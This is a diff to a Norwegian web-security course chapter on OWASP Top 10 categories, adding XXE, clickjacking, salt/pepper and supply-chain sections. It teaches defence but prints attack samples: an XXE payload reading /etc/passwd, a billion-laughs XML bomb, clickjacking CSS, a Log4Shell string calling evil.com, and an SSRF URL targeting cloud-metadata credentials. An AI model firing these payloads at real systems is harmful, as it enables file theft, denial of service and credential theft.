@@ -23,23 +23,25 @@
 <main data-chapter="Kapittel 2: OWASP Top 10">
 <header class="hero">
   <div class="container">
-    <div class="eyebrow">Kapittel 2 · A02 · A05 · A06 · A08 · A10</div>
+    <div class="eyebrow">Kapittel 2 · A02 · A03 · A04 · A08 · A01 (2025)</div>
     <h1>Konfigurasjon, krypto, komponenter og <em>SSRF</em></h1>
     <p class="lede">Default credentials, MD5-passord, Log4Shell, usignerte pakker og servere som henter URL-er de ikke burde — fem kategorier med en felles fellesnevner: svikt i grunnleggende hygiene.</p>
     <nav class="toc">
       <a href="#misconfiguration"><span class="toc-num">01</span>Security misconfiguration</a>
-      <a href="#kryptofeil"><span class="toc-num">02</span>Kryptografiske feil</a>
-      <a href="#sårbare-komponenter"><span class="toc-num">03</span>Sårbare komponenter</a>
-      <a href="#integritetssvikt"><span class="toc-num">04</span>Integritetssvikt</a>
-      <a href="#ssrf"><span class="toc-num">05</span>SSRF</a>
-      <a href="#forsvar-konfig"><span class="toc-num">06</span>Forsvar</a>
+      <a href="#xxe"><span class="toc-num">02</span>XXE</a>
+      <a href="#clickjacking"><span class="toc-num">03</span>Clickjacking</a>
+      <a href="#kryptofeil"><span class="toc-num">04</span>Kryptografiske feil</a>
+      <a href="#sårbare-komponenter"><span class="toc-num">05</span>Supply chain</a>
+      <a href="#integritetssvikt"><span class="toc-num">06</span>Integritetssvikt</a>
+      <a href="#ssrf"><span class="toc-num">07</span>SSRF</a>
+      <a href="#forsvar-konfig"><span class="toc-num">08</span>Forsvar</a>
     </nav>
   </div>
 </header>
 
 <section id="misconfiguration">
   <div class="container">
-    <div class="section-badge">01 · A05</div>
+    <div class="section-badge">01 · A02</div>
     <h2>Security <em>misconfiguration</em></h2>
     <p class="section-intro">Den vanligste kilden til konfigurasjonssårbarheter er ikke angripere — det er standardinnstillinger som aldri ble endret.</p>
     <p class="lead">En utvikler setter opp en ny MongoDB-instans. Standard: autentisering skrudd av. Instansen eksponeres mot internett for å gjøre testing enklere. To dager senere er databasen slettet av en automatisert scanner og en løsepengenotat er lagt igjen. Scenariet er ikke konstruert — det skjedde med titusener av MongoDB-instanser i 2017.</p>
@@ -60,9 +62,142 @@
   </div>
 </section>
 
-<section id="kryptofeil">
+<section id="xxe">
   <div class="container">
     <div class="section-badge">02 · A02</div>
+    <h2>XML External <em>Entities (XXE)</em></h2>
+    <p class="section-intro">En misskonfigurert XML-parser som tillater eksterne entiteter blir et lese-/eksfiltrasjonsverktøy for filer på serveren — eller en denial-of-service-vektor.</p>
+    <p class="lead">XML støtter <em>eksterne entiteter</em> som lar et dokument referere data utenfor seg selv. Hvis applikasjonen tar imot XML fra brukeren og parseren behandler entiteter med URI-er, kan en angriper sende et dokument som tvinger parseren til å lese lokale filer eller åpne nettverkstilkoblinger fra serveren.</p>
+
+    <pre><code><span class="comment">&lt;!-- Angripers payload --&gt;</span>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE test [
+  &lt;!ENTITY xxefile SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;test&gt;&amp;xxefile;&lt;/test&gt;
+
+<span class="comment">&lt;!-- Server-respons inneholder /etc/passwd-innholdet --&gt;</span></code></pre>
+
+    <h3>Billion laughs</h3>
+    <p>En annen XXE-variant er entitets-eksplosjonen som lager en CPU/minne-DoS:</p>
+
+    <figure class="fig-frame">
+      <svg viewBox="0 0 720 280" xmlns="http://www.w3.org/2000/svg" font-family="IBM Plex Sans, sans-serif" font-size="11">
+        <defs>
+          <marker id="lolarr" markerWidth="8" markerHeight="8" refX="4" refY="4" orient="auto">
+            <path d="M1,1 L7,4 L1,7 Z" fill="#b04428"/>
+          </marker>
+        </defs>
+        <!-- DTD declarations -->
+        <rect x="20" y="20" width="280" height="240" rx="3" fill="#1a1612" stroke="#3d3832"/>
+        <text x="35" y="40" font-size="11" fill="#9fb56b" font-family="IBM Plex Mono, monospace">&lt;!DOCTYPE bomb [</text>
+        <text x="35" y="58" font-size="11" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">  &lt;!ENTITY a "lol"&gt;</text>
+        <text x="35" y="76" font-size="11" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">  &lt;!ENTITY b "&amp;a;&amp;a;...&amp;a;"&gt;</text>
+        <text x="35" y="94" font-size="11" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">  &lt;!ENTITY c "&amp;b;&amp;b;...&amp;b;"&gt;</text>
+        <text x="35" y="112" font-size="11" fill="#8a7f6b" font-family="IBM Plex Mono, monospace">  ...</text>
+        <text x="35" y="130" font-size="11" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">  &lt;!ENTITY j "&amp;i;&amp;i;...&amp;i;"&gt;</text>
+        <text x="35" y="148" font-size="11" fill="#9fb56b" font-family="IBM Plex Mono, monospace">]&gt;</text>
+        <text x="35" y="170" font-size="11" fill="#c68a1f" font-family="IBM Plex Mono, monospace">&lt;bomb&gt;&amp;j;&lt;/bomb&gt;</text>
+        <text x="35" y="200" font-size="10" fill="#a39886" font-style="italic" font-family="IBM Plex Sans, sans-serif">10 nivåer × 9 referanser =</text>
+        <text x="35" y="216" font-size="10" fill="#a39886" font-style="italic" font-family="IBM Plex Sans, sans-serif">9¹⁰ ≈ 3,5 milliarder "lol"</text>
+        <text x="35" y="232" font-size="10" fill="#b04428" font-weight="600" font-family="IBM Plex Sans, sans-serif">≈ 11 GB minne</text>
+
+        <!-- Arrow -->
+        <line x1="305" y1="140" x2="395" y2="140" stroke="#b04428" stroke-width="1.5" marker-end="url(#lolarr)"/>
+        <text x="350" y="135" text-anchor="middle" font-size="10" fill="#b04428" font-style="italic">parser ekspanderer</text>
+
+        <!-- Result -->
+        <rect x="400" y="40" width="300" height="200" rx="3" fill="#1a1612" stroke="#b04428"/>
+        <text x="415" y="60" font-size="9" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">lollollollollollollollollol</text>
+        <text x="415" y="74" font-size="9" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">lollollollollollollollollol</text>
+        <text x="415" y="88" font-size="9" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">lollollollollollollollollol</text>
+        <text x="415" y="102" font-size="9" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">lollollollollollollollollol</text>
+        <text x="415" y="116" font-size="9" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">lollollollollollollollollol</text>
+        <text x="415" y="130" font-size="9" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">lollollollollollollollollol</text>
+        <text x="415" y="144" font-size="9" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">lollollollollollollollollol</text>
+        <text x="415" y="158" font-size="9" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">lollollollollollollollollol</text>
+        <text x="415" y="172" font-size="9" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">lollollollollollollollollol</text>
+        <text x="415" y="186" font-size="9" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">lollollollollollollollollol</text>
+        <text x="415" y="200" font-size="9" fill="#8a7f6b" font-family="IBM Plex Mono, monospace">... × milliarder</text>
+        <text x="415" y="225" font-size="11" fill="#b04428" font-weight="700" font-family="IBM Plex Sans, sans-serif">→ Server OOM / DoS</text>
+      </svg>
+      <figcaption>Billion laughs / XML bomb: nestede entitetsreferanser ekspanderer eksponentielt og spiser opp alt minnet på serveren.</figcaption>
+    </figure>
+
+    <div class="callout callout-blue">
+      <h4>Fix</h4>
+      <p>Deaktiver eksterne entiteter og DTD-prosessering i parseren. I Python: bruk <code>defusedxml</code> i stedet for stdlib <code>xml</code>. I Java: <code>setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)</code>. XXE er klassifisert under A02 Security Misconfiguration i 2025 fordi parseren typisk er sårbar by default og må <em>aktivt</em> herdes.</p>
+    </div>
+
+    <pre><code><span class="comment"># Sårbar (Python stdlib)</span>
+<span class="keyword">from</span> xml.dom <span class="keyword">import</span> pulldom
+data = pulldom.parse(user_uploaded_xml)
+
+<span class="comment"># Sikker</span>
+<span class="keyword">from</span> defusedxml <span class="keyword">import</span> pulldom
+data = pulldom.parse(user_uploaded_xml)</code></pre>
+  </div>
+</section>
+
+<section id="clickjacking">
+  <div class="container">
+    <div class="section-badge">03 · A02</div>
+    <h2>Click<em>jacking</em></h2>
+    <p class="section-intro">Angriperen legger sin egen side i en transparent iframe over en uskyldig knapp — offeret tror han klikker på «Vinn», men klikker i virkeligheten «Overfør 10 000 kr».</p>
+    <p class="lead">Sårbarheten er en <em>konfigurasjonssvikt</em> hos den angrepne applikasjonen: serveren sender ikke en header som forbyr at sidene legges inn i en iframe på et annet domene. Angriperen kan da bygge en lokkemiddel-side på <code>evil.com</code>, laste inn <code>bank.no/overfør</code> i en iframe satt til <code>opacity: 0</code>, og synkronisere posisjonen slik at offerets klikk treffer overføringsknappen i den usynlige iframen.</p>
+
+    <figure class="fig-frame">
+      <svg viewBox="0 0 720 270" xmlns="http://www.w3.org/2000/svg" font-family="IBM Plex Sans, sans-serif" font-size="12">
+        <!-- Bottom layer: visible bait -->
+        <rect x="80" y="40" width="280" height="180" rx="4" fill="rgba(61,107,58,0.12)" stroke="#3d6b3a" stroke-width="1.5"/>
+        <text x="220" y="65" text-anchor="middle" font-weight="600" fill="#3d6b3a">evil.com (synlig for offer)</text>
+        <text x="220" y="90" text-anchor="middle" font-size="11" fill="#6b6257" font-style="italic">«Klikk for å vinne!»</text>
+        <rect x="160" y="120" width="120" height="50" rx="6" fill="#3d6b3a"/>
+        <text x="220" y="151" text-anchor="middle" fill="#fff" font-weight="700" font-size="14">VINN</text>
+        <text x="220" y="195" text-anchor="middle" font-size="10" fill="#a39886" font-style="italic">offerets oppfattede side</text>
+
+        <!-- Top layer: invisible bank -->
+        <rect x="80" y="40" width="280" height="180" rx="4" fill="rgba(45,74,122,0.05)" stroke="#2d4a7a" stroke-width="1" stroke-dasharray="4,3"/>
+        <text x="220" y="65" text-anchor="middle" font-weight="600" fill="#2d4a7a" opacity="0.4">bank.no/overfør (iframe, opacity: 0)</text>
+        <rect x="160" y="120" width="120" height="50" rx="6" fill="none" stroke="#b04428" stroke-width="2" stroke-dasharray="4,3"/>
+        <text x="220" y="151" text-anchor="middle" fill="#b04428" font-weight="700" font-size="14">OVERFØR</text>
+
+        <!-- Click indicator -->
+        <circle cx="220" cy="145" r="14" fill="none" stroke="#b04428" stroke-width="2"/>
+        <text x="220" y="150" text-anchor="middle" font-size="14" font-weight="700" fill="#b04428">×</text>
+        <text x="220" y="240" text-anchor="middle" font-size="11" fill="#b04428" font-weight="600">offerets klikk → bankens overføringsknapp</text>
+
+        <!-- Right side: HTML / fix -->
+        <rect x="400" y="40" width="290" height="100" rx="3" fill="#1a1612" stroke="#3d3832"/>
+        <text x="415" y="60" font-size="10" fill="#8a7f6b" font-family="IBM Plex Mono, monospace">/* angripers CSS */</text>
+        <text x="415" y="78" font-size="10" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">#top {</text>
+        <text x="425" y="92" font-size="10" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">  position: absolute;</text>
+        <text x="425" y="106" font-size="10" fill="#c68a1f" font-family="IBM Plex Mono, monospace">  opacity: 0;</text>
+        <text x="425" y="120" font-size="10" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">  z-index: 999;</text>
+        <text x="415" y="134" font-size="10" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">}</text>
+
+        <rect x="400" y="155" width="290" height="100" rx="3" fill="#1a1612" stroke="#3d6b3a" stroke-width="1.5"/>
+        <text x="415" y="175" font-size="10" fill="#9fb56b" font-family="IBM Plex Mono, monospace">// fix på bank.no respons-headere</text>
+        <text x="415" y="193" font-size="10" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">X-Frame-Options: DENY</text>
+        <text x="415" y="211" font-size="10" fill="#8a7f6b" font-family="IBM Plex Mono, monospace">// eller via CSP:</text>
+        <text x="415" y="229" font-size="10" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">Content-Security-Policy:</text>
+        <text x="425" y="245" font-size="10" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">frame-ancestors 'none'</text>
+      </svg>
+      <figcaption>Clickjacking-overlay: usynlig iframe (øverst) over et synlig lokkemiddel (nederst). Offerets klikk treffer iframen, ikke det de tror de klikker på.</figcaption>
+    </figure>
+
+    <p>Mottiltak:</p>
+    <ul>
+      <li><strong><code>X-Frame-Options: DENY</code></strong> — siden kan aldri bygges inn i en iframe. <code>SAMEORIGIN</code> tillater bare ramming fra eget domene.</li>
+      <li><strong><code>Content-Security-Policy: frame-ancestors 'none'</code></strong> — moderne erstatning for <code>X-Frame-Options</code>, støtter også eksplisitte allowlists (<code>frame-ancestors https://partner.example.com</code>).</li>
+      <li><strong>Frame-busting JavaScript</strong> — gammel teknikk (<code>if (top !== self) top.location = self.location</code>), kan omgås av <code>sandbox</code>-attributtet og bør ikke være eneste forsvar.</li>
+    </ul>
+  </div>
+</section>
+
+<section id="kryptofeil">
+  <div class="container">
+    <div class="section-badge">04 · A04</div>
     <h2>Krypto<em>grafiske feil</em></h2>
     <p class="section-intro">Kryptografifeil skyldes sjelden svakheter i algoritmene — de skyldes feil bruk av riktige algoritmer.</p>
     <p class="lead">En applikasjon lagrer passord som <code>MD5(passord)</code>. MD5 er ikke kryptert — det er en kryptografisk hashfunksjon, men en rask en. En angriper med GPU kan beregne milliarder av MD5-hashes per sekund. Med et rainbow table er det enda raskere. Passordet «Passord123» er knekket på under et millisekund. Det er ikke et nøkkelspørsmål om MD5 er «kryptert» — det er et spørsmål om hastighet.</p>
@@ -78,6 +213,57 @@ stored = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
 <span class="comment"># Verifiser</span>
 bcrypt.checkpw(input_password.encode(), stored)</code></pre>
 
+    <h3>Salt og pepper</h3>
+    <p>To distinkte forsvarslag mot dictionary-angrep og rainbow table-oppslag på passordhasher. Begge legger ekstra bytes til passordet før hashing, men de lever på forskjellige steder.</p>
+
+    <figure class="fig-frame">
+      <svg viewBox="0 0 720 280" xmlns="http://www.w3.org/2000/svg" font-family="IBM Plex Sans, sans-serif" font-size="11">
+        <!-- Title -->
+        <text x="360" y="20" text-anchor="middle" font-weight="600" fill="#3d3832" font-size="13">hash(passord ‖ salt ‖ pepper)</text>
+
+        <!-- Database -->
+        <rect x="40" y="50" width="320" height="180" rx="4" fill="rgba(45,74,122,0.08)" stroke="#2d4a7a" stroke-width="1.5"/>
+        <text x="200" y="72" text-anchor="middle" font-weight="600" fill="#2d4a7a">Database</text>
+
+        <!-- DB rows -->
+        <rect x="60" y="85" width="280" height="40" rx="3" fill="#fff" stroke="#c9c0ae"/>
+        <text x="70" y="103" font-size="10" fill="#6b6257" font-family="IBM Plex Mono, monospace">user: alice</text>
+        <text x="70" y="118" font-size="10" fill="#6b6257" font-family="IBM Plex Mono, monospace">salt: 7a3f9c</text>
+        <text x="180" y="118" font-size="10" fill="#3d6b3a" font-family="IBM Plex Mono, monospace">hash: $2b$12$...</text>
+
+        <rect x="60" y="135" width="280" height="40" rx="3" fill="#fff" stroke="#c9c0ae"/>
+        <text x="70" y="153" font-size="10" fill="#6b6257" font-family="IBM Plex Mono, monospace">user: bob</text>
+        <text x="70" y="168" font-size="10" fill="#6b6257" font-family="IBM Plex Mono, monospace">salt: e21b04</text>
+        <text x="180" y="168" font-size="10" fill="#3d6b3a" font-family="IBM Plex Mono, monospace">hash: $2b$12$...</text>
+
+        <text x="200" y="200" text-anchor="middle" font-size="10" fill="#a39886" font-style="italic">Salt: unik per bruker, lagres ved siden av hash</text>
+        <text x="200" y="215" text-anchor="middle" font-size="10" fill="#a39886" font-style="italic">→ stopper rainbow tables, online dictionary</text>
+
+        <!-- Pepper vault -->
+        <rect x="400" y="50" width="280" height="180" rx="4" fill="rgba(176,68,40,0.08)" stroke="#b04428" stroke-width="1.5"/>
+        <text x="540" y="72" text-anchor="middle" font-weight="600" fill="#b04428">Secrets manager / HSM</text>
+        <text x="540" y="88" text-anchor="middle" font-size="10" fill="#6b6257" font-style="italic">(utenfor DB)</text>
+
+        <rect x="430" y="105" width="220" height="50" rx="3" fill="#fff" stroke="#b04428" stroke-dasharray="3,3"/>
+        <text x="540" y="125" text-anchor="middle" font-size="11" fill="#b04428" font-family="IBM Plex Mono, monospace" font-weight="600">PEPPER</text>
+        <text x="540" y="142" text-anchor="middle" font-size="10" fill="#6b6257" font-family="IBM Plex Mono, monospace">9f3a...c421 (256 bit)</text>
+
+        <text x="540" y="180" text-anchor="middle" font-size="10" fill="#a39886" font-style="italic">Pepper: global, kun applikasjonen kjenner den</text>
+        <text x="540" y="195" text-anchor="middle" font-size="10" fill="#a39886" font-style="italic">→ stopper offline dictionary selv ved DB-lekkasje</text>
+        <text x="540" y="215" text-anchor="middle" font-size="10" fill="#b04428" font-weight="600">samme verdi for alle brukere</text>
+
+        <!-- Bottom: combined formula -->
+        <rect x="40" y="245" width="640" height="30" rx="3" fill="#1a1612" stroke="#3d3832"/>
+        <text x="360" y="265" text-anchor="middle" font-size="11" fill="#e8e3d6" font-family="IBM Plex Mono, monospace">stored = bcrypt(password + salt_per_user + PEPPER_global, cost=12)</text>
+      </svg>
+      <figcaption>Salt sitter ved siden av hashen i DB (per bruker, unik). Pepper sitter <em>utenfor</em> DB i secrets manager (global, hemmelig). Stjeler angriperen DB-en, mangler hen fortsatt pepper og kan ikke kjøre offline brute-force.</figcaption>
+    </figure>
+
+    <ul>
+      <li><strong>Salt</strong> — unik tilfeldig verdi per bruker, lagret sammen med hashen. Hindrer at to brukere med samme passord får samme hash, og gjør forhåndsberegnede rainbow tables ubrukelige. <code>bcrypt.gensalt()</code> gjør dette automatisk.</li>
+      <li><strong>Pepper</strong> — én global hemmelig verdi som applikasjonen henter fra secrets manager / miljøvariabel ved oppstart, aldri fra DB. Hvis DB-en lekker uten at applikasjonsserveren er kompromittert, må angriperen også gjette pepper for å brute-force passordene offline.</li>
+    </ul>
+
     <p>Andre vanlige kryptografifeil:</p>
     <ul>
       <li><strong>ECB-modus:</strong> identiske klartekstblokker gir identiske chiffreblokker — mønstre bevares. Bruk GCM eller CBC med tilfeldig IV.</li>
@@ -90,24 +276,40 @@ bcrypt.checkpw(input_password.encode(), stored)</code></pre>
 
 <section id="sårbare-komponenter">
   <div class="container">
-    <div class="section-badge">03 · A06</div>
-    <h2>Sårbare og utdaterte <em>komponenter</em></h2>
-    <p class="section-intro">Du skriver kanskje 5 % av koden som kjører i applikasjonen din. Resten er avhengigheter — og de har sine egne sårbarheter.</p>
+    <div class="section-badge">05 · A03 (NY 2025)</div>
+    <h2>Software Supply Chain <em>Failures</em></h2>
+    <p class="section-intro">A03:2025 utvider den gamle «sårbare komponenter»-kategorien til hele leverandørkjeden — fra kildekode til build, signering og distribusjon.</p>
     <p class="lead">Desember 2021. En kritisk sårbarhet avsløres i Log4j2, et Java-logging-bibliotek brukt i titusener av systemer verden over. En angriper kan kjøre vilkårlig kode ved å logge en streng som <code>${jndi:ldap://evil.com/x}</code>. Bare det å logge en brukerleverte melding — noe alle systemer gjør — er nok. Log4Shell er ikke et eksotisk angrep mot en obskur komponent. Det er et angrep mot infrastruktur.</p>
 
-    <p>Håndtering av sårbare komponenter:</p>
+    <p>Supply chain-feil omfatter mer enn bare gamle avhengigheter — hele kjeden fra kode til kjørende artefakt er angrepsflate:</p>
+    <ul>
+      <li><strong>Sårbare avhengigheter:</strong> kjente CVE-er i tredjepartspakker (Log4Shell, event-stream-bakdøren, ua-parser-js-kompromitteringen).</li>
+      <li><strong>Typosquatting:</strong> ondsinnede pakker med navn som ligner populære biblioteker (<code>requets</code> i stedet for <code>requests</code>).</li>
+      <li><strong>Dependency confusion:</strong> intern pakkenavn publisert offentlig på npm/PyPI med høyere versjon — pakkemanageren foretrekker den offentlige.</li>
+      <li><strong>Kompromittert vedlikeholder:</strong> en angriper overtar en npm/PyPI-konto og publiserer en bakdørversjon (xz-utils-bakdøren 2024).</li>
+      <li><strong>Build-pipeline-kompromittering:</strong> SolarWinds-typen — angriperen modifiserer artefaktet etter compile, før signering.</li>
+    </ul>
+
+    <p>Håndtering av supply chain-risiko:</p>
     <ul>
       <li><strong>SCA (Software Composition Analysis):</strong> automatisk skanning av avhengigheter mot kjente sårbarhetsdatabaser (NVD, OSV, GitHub Advisory). Verktøy: Dependabot, Snyk, OWASP Dependency-Check.</li>
-      <li><strong>SBOM (Software Bill of Materials):</strong> komplett liste over alle komponenter og versjoner — nødvendig for å vite hva du har.</li>
-      <li><strong>Oppdateringsrutiner:</strong> automatiske sikkerhetsoppdateringer for avhengigheter, men med tester som verifiserer at oppdateringen ikke brekker noe.</li>
-      <li><strong>Minimale avhengigheter:</strong> færre pakker betyr færre sårbarheter. Fjern det som ikke brukes.</li>
+      <li><strong>SBOM (Software Bill of Materials):</strong> komplett, maskinlesbar liste over alle komponenter og versjoner (CycloneDX, SPDX). Nødvendig for å vite hva du har når neste Log4Shell publiseres.</li>
+      <li><strong>Lock-filer + integritets-hash:</strong> <code>package-lock.json</code>, <code>poetry.lock</code>, <code>Pipfile.lock</code> låser eksakte versjoner og verifiserer SHA-checksum ved install.</li>
+      <li><strong>Artefaktsignering:</strong> sigstore/cosign for container images, npm provenance, Maven GPG-signaturer. Verifiser før deploy.</li>
+      <li><strong>Build-isolering:</strong> CI/CD i hermetiske, ephemerale miljøer med minimal nettverkstilgang og full audit-logging.</li>
+      <li><strong>Minimale avhengigheter:</strong> færre pakker betyr mindre angrepsflate. Fjern det som ikke brukes.</li>
     </ul>
+
+    <div class="callout callout-yellow">
+      <h4>Hvorfor egen kategori i 2025?</h4>
+      <p>Frekvensen av leverandørkjedeangrep har eksplodert siden 2020 (SolarWinds, Codecov, ua-parser-js, xz-utils). OWASP Top 10 2025 hever dette fra et «komponenter»-problem (gammel A06) til en bredere kategori som dekker hele kjeden fra utvikler-laptop til produksjonsartefakt.</p>
+    </div>
   </div>
 </section>
 
 <section id="integritetssvikt">
   <div class="container">
-    <div class="section-badge">04 · A08</div>
+    <div class="section-badge">06 · A08</div>
     <h2>Software og data <em>integritetssvikt</em></h2>
     <p class="section-intro">A08 handler om kode og infrastruktur som tas i bruk uten å verifisere at de er hva de utgir seg for å være.</p>
     <p class="lead">En CI/CD-pipeline henter en avhengighet fra npm. Pakken er legitim — men en angriper har kompromittert vedlikeholderens konto og lastet opp en ny versjon med bakdør. Applikasjonen deployes automatisk til produksjon ved neste bygg. Ingen har sett koden. Ingen har verifisert signaturen. Det er A08 i praksis — og det er slik SolarWinds-angrepet i 2020 fungerte, bare mot Orion-byggeprosessen.</p>
@@ -143,7 +345,7 @@ data = json.loads(user_controlled_string)   <span class="comment"># bare primiti
 
 <section id="ssrf">
   <div class="container">
-    <div class="section-badge">05 · A10</div>
+    <div class="section-badge">07 · A01 (2025)</div>
     <h2>Server-Side Request <em>Forgery</em></h2>
     <p class="section-intro">SSRF er et angrep der serveren gjøres til en proxy angriperen kontrollerer — og serveren er innenfor brannmuren.</p>
     <p class="lead">En funksjon lar brukere importere bilder fra URL. Brukeren sender <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>. Serveren henter URL-en — den er tross alt innenfor AWS sin infrastruktur — og returnerer midlertidige IAM-credentials til angriperen. Med disse credentials kan angriperen aksessere S3-bøtter, sette opp EC2-instanser og eskalere til full kontokompromittering.</p>
@@ -193,7 +395,7 @@ data = json.loads(user_controlled_string)   <span class="comment"># bare primiti
 
 <section id="forsvar-konfig">
   <div class="container">
-    <div class="section-badge">06 · Forsvar</div>
+    <div class="section-badge">08 · Forsvar</div>
     <h2>Forsvar mot konfig-, krypto-, integritets- og <em>SSRF-feil</em></h2>
     <p class="section-intro">Alle fem kategoriene har veldokumenterte fixes — de krever ikke avansert kunnskap, de krever konsistens.</p>
     <p class="lead">Den felles tråden i misconfiguration, cryptographic failures, vulnerable components, software integrity failures og SSRF er at de alle oppstår i fravær av aktiv innsats — ikke i nærvær av avanserte angrep. Et system som aldri er herdet, en hashfunksjon som aldri er oppdatert, en avhengighet som aldri er patched, en artefakt som aldri er signert, en URL-validering som aldri ble skrevet. Forsvar er rutine, ikke heroisme.</p>
